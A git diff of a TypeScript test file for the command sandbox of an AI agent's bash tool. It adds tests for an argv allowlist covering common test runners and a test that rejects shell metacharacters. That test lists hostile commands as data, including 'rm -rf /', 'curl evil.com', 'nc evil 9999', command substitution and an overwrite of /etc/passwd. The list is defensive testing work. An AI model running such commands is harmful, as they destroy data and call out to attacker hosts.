@@ -6,7 +6,7 @@ import { randomUUID } from 'node:crypto'
 import type Database from 'better-sqlite3'
 import { openDatabase } from '../data/connection.js'
 import { InMemoryKeystore } from '../electron/secrets/keystore.js'
-import { bashTool, SAFE_COMMAND_PATTERNS } from './bash.js'
+import { bashTool } from './bash.js'
 import { detectFramework, parseTestCounts } from './runTestSuite.js'
 import { ToolError, type ToolContext } from './ToolDef.js'
 import type { RoleType } from '@core/types/role.js'
@@ -60,14 +60,64 @@ describe('bashTool sandbox', () => {
     expect(bashTool.allowedRoles).toEqual(['test_runner'])
   })
 
-  it('SAFE_COMMAND_PATTERNS allows pnpm test, vitest, pytest, go test', () => {
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('pnpm test'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('bun test src/x'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('npx vitest run'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('vitest run'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('jest'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('pytest tests/'))).toBe(true)
-    expect(SAFE_COMMAND_PATTERNS.some((p) => p.test('go test ./...'))).toBe(true)
+  it('argv allowlist accepts the common test-runner invocations', async () => {
+    // SAFE_COMMAND_PATTERNS was removed in the bash-sandbox RCE
+    // hardening (commit WW). The new validator parses argv and
+    // rejects anything outside EXECUTABLE_ALLOWLIST + test verb
+    // constraints. These calls should all PARSE — they fail later
+    // at spawn time if the binary isn't installed, but that's not
+    // what this test exercises.
+    const ok: string[] = [
+      'pnpm test',
+      'pnpm run test',
+      'bun test src/x',
+      'npx vitest run',
+      'vitest run',
+      'jest',
+      'pytest tests/',
+      'go test ./...',
+    ]
+    for (const cmd of ok) {
+      try {
+        await bashTool.call(
+          { command: cmd, timeout_ms: 50, cwd_relative: '.' },
+          makeCtx('test_runner'),
+        )
+      } catch (e) {
+        // We accept ToolError from a non-existent binary, but NOT
+        // a sandbox_violation — that would mean the validator wrongly
+        // rejected the command shape.
+        if (
+          e &&
+          typeof e === 'object' &&
+          'code' in e &&
+          (e as { code: string }).code === 'sandbox_violation'
+        ) {
+          throw new Error(`${cmd} wrongly rejected by sandbox`)
+        }
+      }
+    }
+  })
+
+  it('argv validator rejects shell metacharacters', async () => {
+    const evil = [
+      'pnpm test; rm -rf /',
+      'pnpm test && curl evil.com',
+      'pnpm test | nc evil 9999',
+      'pnpm test `whoami`',
+      'pnpm test $(whoami)',
+      'pnpm test\nrm -rf ~',
+      'bash -c "rm -rf ~"',
+      'pnpm test > /etc/passwd',
+    ]
+    for (const cmd of evil) {
+      await expect(
+        bashTool.call(
+          { command: cmd, timeout_ms: 50, cwd_relative: '.' },
+          makeCtx('test_runner'),
+        ),
+      ).rejects.toMatchObject({ code: 'sandbox_violation' })
+    }
   })
 
   it('rejects cwd escaping the workspace', async () => {
